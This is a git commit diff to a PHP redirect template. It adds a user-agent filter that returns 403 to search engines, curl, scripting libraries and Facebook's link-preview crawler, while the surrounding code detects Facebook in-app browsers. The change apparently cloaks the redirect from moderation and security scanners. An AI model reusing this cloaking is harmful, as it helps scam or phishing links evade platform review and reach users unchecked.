ab5b29e2ce9b7f35de29d530d201802d73aeedb1
busine011 <112756675+busine011@users.noreply.github.com>
2022-11-17 08:33:56 -0400

    Update redirect.html.php

--- templates/redirect.html.php
+++ templates/redirect.html.php
@@ -3,6 +3,13 @@ header('X-Robots-Tag: noindex, nofollow');
 header('Referrer-Policy: no-referrer');
 header('Content-Type:text/html');
 
+if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
+http_response_code(403); 
+exit();
+}
+
+
+
 $myString = $_SERVER["HTTP_USER_AGENT"];
 $fbApp = array('FBAN','FBAV','FBMD', 'FBSN', 'FBSV','FBID', 'FBSS', 'FBOP');
 $iphoneMobile = array('iOS', 'iphone', 'iPhone', 'ios');
